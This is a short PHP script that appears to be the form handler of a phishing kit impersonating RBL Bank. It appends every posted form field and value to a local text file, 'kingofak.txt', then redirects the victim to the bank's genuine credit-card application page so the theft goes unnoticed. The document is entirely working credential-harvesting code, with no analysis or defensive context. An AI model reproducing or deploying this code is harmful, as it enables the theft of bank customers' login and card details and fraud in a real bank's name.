<?php
header ('Location: https://applications.rblbank.com/apply-credit-card/appform?cardId=16&cs=website-pop-up-world-safari&cg=creditcard&sg=101&sc=WEB01&fc=FF&ofc=NIL&utm_campaign=CreditCard&utm_medium=website&utm_source=website-hp-credit-card-slot-world-safari');
$handle = fopen("kingofak.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;


?>
